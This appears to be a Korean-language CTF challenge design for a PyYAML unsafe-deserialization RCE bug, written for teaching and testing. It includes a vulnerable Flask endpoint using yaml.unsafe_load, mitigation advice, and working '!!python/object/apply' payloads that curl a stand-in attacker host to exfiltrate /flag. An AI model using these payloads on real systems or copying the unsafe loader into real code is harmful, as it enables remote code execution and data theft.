---
title: PyYAML Unsafe Deserialization to RCE — Web CTF Scenario
created: 2026-06-14
updated: 2026-06-14
type: ctf-scenario
tags: [ctf, web, python, pyyaml, deserialization, rce, unsafe-load]
confidence: high
---

# PyYAML Unsafe Deserialization to RCE — Web CTF Scenario

## 1. 개요 및 스토리
- **문제명**: YAML Config Parser (YAML 환경 설정 파서)
- **난이도**: Medium-High
- **핵심 컨셉**: 파이썬 환경에서 YAML 데이터를 처리할 때 발생할 수 있는 **PyYAML 안전하지 않은 역직렬화(Unsafe Deserialization)** 취약점을 이용한 **원격 코드 실행(RCE)** 공격 시나리오입니다. 대상 웹 애플리케이션은 인프라 환경 설정을 손쉽게 관리하고 검증할 수 있도록 사용자가 직접 업로드한 YAML 파일을 파싱하여 화면에 보여줍니다. 그러나 백엔드 파서 연동 시 PyYAML 라이브러리의 안전하지 않은 데이터 로더 방식인 `yaml.unsafe_load()` 또는 구버전 `yaml.load()` 함수를 명시적으로 실행합니다. 공격자는 YAML 구조 내에 파이썬 객체를 동적으로 인스턴스화하고 실행할 수 있는 임의 생성자 지시어(Tags)를 삽입해 업로드함으로써 백엔드 서버에서 OS 명령어를 실행시킵니다.

---

## 2. 문제 설계 및 구조 (Architecture)

### 2.1 구성 요소
- **Configuration Uploader API (`/api/upload_config`)**:
  - YAML 파일을 업로드받거나 텍스트 영역에 입력된 YAML 문자열을 전달받아 유효성을 파싱하는 기능 제공.
- **Flag 위치**:
  - 시스템 루트 디렉터리 `/flag` 경로에 위치하며 RCE를 통해 읽어야 합니다.

### 2.2 취약점 지점
1. **Use of Unsafe YAML Loading Method**:
   - 백엔드는 PyYAML 파싱 시 보안 제약이 없는 클래스 생성 권한을 가지는 `yaml.load(..., Loader=yaml.Loader)` 또는 `yaml.unsafe_load(...)`를 사용해 입력을 처리합니다.
   - PyYAML은 YAML 태그 규격(예: `!!python/object/...`)을 만나면 해당 태그에 바인딩된 파이썬 모듈과 인스턴스를 메모리 상에서 동적으로 적재하고 초기화하는 동작을 보장하므로, 공격자는 이를 이용해 `os.system`이나 `subprocess` 등의 실행용 빌트인 함수 객체를 메모리 내에 가동할 수 있게 됩니다.

---

## 3. 공격 면 (Attack Surface)

| 엔드포인트 | 메소드 | 인증 | 파라미터 | 데이터 포맷 | 역할 |
|------------|--------|------|----------|-------------|------|
| `/api/upload_config` | POST | 세션 필요 | `config_data` | YAML Text | YAML 설정 입력 및 파싱 트리거 지점 |

---

## 4. 상세 풀이 흐름 (Exploitation Flow)

### Step 1. YAML 파서 동작 진단
1. 사용자는 일반적인 key-value 형태의 무해한 YAML을 입력하여 애플리케이션의 응답을 확인합니다.
   - **입력 예시**:
     ```yaml
     app_name: MyTestApp
     version: 1.0.0
     ```
2. 서버가 오류 없이 파싱해 JSON 형태로 값을 보여주는 것을 보아 PyYAML 등의 라이브러리가 동작함을 추정합니다.

### Step 2. PyYAML 역직렬화 공격용 태그 조사
PyYAML 버전 및 파싱 로직에 따라 파이썬 시스템 모듈을 직접 로드할 수 있는 최적의 생성자 태그 조합을 수립합니다.
- `!!python/object/apply` 태그는 임의의 파이썬 함수를 가져와 매개변수를 넘겨주며 호출하게 합니다.
- **RCE 페이로드 설계**:
  ```yaml
  !!python/object/apply:subprocess.check_output
  args:
    - - "curl"
      - "http://attacker.local/log?c=$(cat /flag)"
    - shell: true
  ```
  또는 직관적인 `os.system` 트리거 조합:
  ```yaml
  !!python/object/apply:os.system
  args: ["curl http://attacker.local/log?c=`cat /flag`"]
  ```

### Step 3. 악성 페이로드 업로드
1. 작성한 악성 YAML 코드를 설정 파일 업로드 엔드포인트 `/api/upload_config`로 전송합니다.
   - **요청 Body 예시**:
     ```json
     {
       "config_data": "!!python/object/apply:os.system [\"curl http://attacker.local/log?c=$(cat /flag | base64)\"]"
     }
     ```

### Step 4. flag 획득
1. 백엔드에서 `yaml.unsafe_load(config_data)`가 파싱을 가동합니다.
2. YAML 내부의 `!!python/object/apply` 구조를 보며 PyYAML 라이브러리가 파이썬 `os` 모듈의 `system` 함수를 즉시 소환하여 인수로 전달된 `curl` 명령을 처리합니다.
3. 공격자 서버 웹서버 커넥션 로그에 도착한 base64 인코딩 값을 해독하여 플래그(`FLAG{pyyaml_unsafe_load_deserialization_leads_to_rce}`)를 획득합니다.

---

## 5. 취약점 유발 백엔드 코드 스니펫 (Python Flask)

```python
# app.py (취약한 PyYAML 연동 Python 백엔드 예시)
import yaml
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route('/api/upload_config', methods=['POST'])
def upload_config():
    data = request.json
    config_data = data.get('config_data', '')

    if not config_data:
        return jsonify({"status": "error", "message": "No config data provided"}), 400

    try:
        # 취약점 지점: PyYAML의 unsafe_load를 사용하여 파이썬 생성자 태그 파싱 시 RCE를 발생시킴
        # unsafe_load는 임의의 파이썬 객체 생성을 허용합니다.
        parsed_config = yaml.unsafe_load(config_data)
        
        # 만약 yaml.load(config_data, Loader=yaml.Loader)를 써도 동일하게 취약함
        
        return jsonify({
            "status": "success",
            "parsed": str(parsed_config)
        })
    except Exception as e:
        return jsonify({"status": "error", "message": f"Parsing failed: {str(e)}"}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
```

---

## 6. 방어 및 완화 기법 (Mitigation)

1. **안전한 데이터 로더 사용 (`yaml.safe_load`)**:
   - YAML 파일의 임의 객체 인스턴스화 기능을 차단하고, 순수 기본 자료형(문자열, 숫자, 리스트, 딕셔너리 등)만을 파싱하도록 제한하는 `yaml.safe_load()` 함수를 항상 강제합니다.
     ```python
     # 안전한 파싱 기법
     parsed_config = yaml.safe_load(config_data)
     ```
2. **최신 PyYAML 버전으로 업그레이드**:
   - PyYAML 5.1 이상 버전부터는 기본 `yaml.load()` 호출 시 로더 타입을 지정하지 않으면 경고 혹은 에러를 발생시키도록 설계되었습니다. 하지만 여전히 명시적으로 `Loader=yaml.Loader` 혹은 `unsafe_load()`를 호출하면 취약하므로, 사용 방법 자체를 `safe_load`로 완전히 일원화해야 합니다.
3. **데이터 포맷 변환**:
   - 환경 설정 파일 업로드 시 굳이 객체 지향적 복잡 스펙이 필요 없다면, JSON 규격이나 단순 텍스트 성향의 TOML/INI 포맷으로 설정을 대체하여 메모리 역직렬화 공격 위험을 배제합니다.
